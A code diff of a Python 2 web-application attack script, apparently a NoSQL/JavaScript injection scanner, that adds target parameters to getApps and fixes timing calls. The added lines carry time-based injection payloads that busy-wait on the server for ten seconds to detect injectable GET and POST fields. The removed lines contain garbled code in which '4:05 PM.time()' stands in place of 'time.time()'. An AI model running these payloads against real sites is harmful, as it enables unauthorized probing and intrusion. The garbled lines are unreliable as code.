@@ -6,7 +6,7 @@ import datetime
 import itertools
 import re
 
-def getApps():
+def getApps(victim,webPort,uri,https,verb):
     print "Web App Attacks (GET)"
     print "==============="
     paramName = []
@@ -46,9 +46,9 @@ def getApps():
         if appRespCode == 200:
             normLength = int(len(urllib2.urlopen(req).read()))
             timeReq = urllib2.urlopen(req)
-            start = 4:05 PM.time()
+            start = time.time()
             page = timeReq.read()
-            end = 4:05 PM.time()
+            end = time.time()
             timeReq.close()
             timeBase = round((end - start), 3)
 
@@ -260,10 +260,10 @@ def getApps():
 
             print "Starting Javascript integer escape time based injection..."
             req = urllib2.Request(uriArray[9], None, requestHeaders)
-            start = 4:05 PM.time()
+            start = time.time()
             intTimeInj = urllib2.urlopen(req)
             page = intTimeInj.read()
-            end = 4:05 PM.time()
+            end = time.time()
             intTimeInj.close()
             #print str(end)
             #print str(start)
@@ -371,9 +371,9 @@ def postApps():
 
             normLength = int(len(urllib2.urlopen(req).read()))
             timeReq = urllib2.urlopen(req)
-            start = 4:05 PM.time()
+            start = time.time()
             page = timeReq.read()
-            end = 4:05 PM.time()
+            end = time.time()
             timeReq.close()
             timeBase = round((end - start), 3)
 
@@ -609,9 +609,9 @@ def postApps():
             postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
             body = urllib.urlencode(postData)
             conn = urllib2.urlopen(req,body)
-            start = 4:05 PM.time()
+            start = time.time()
             page = conn.read()
-            end = 4:05 PM.time()
+            end = time.time()
             conn.close()
             print str(end)
             print str(start)
@@ -629,10 +629,10 @@ def postApps():
 
             postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
             body = urllib.urlencode(postData)
-            start = 4:05 PM.time()
+            start = time.time()
             conn = urllib2.urlopen(req,body)
             page = conn.read()
-            end = 4:05 PM.time()
+            end = time.time()
             conn.close()
             print str(end)
             print str(start)
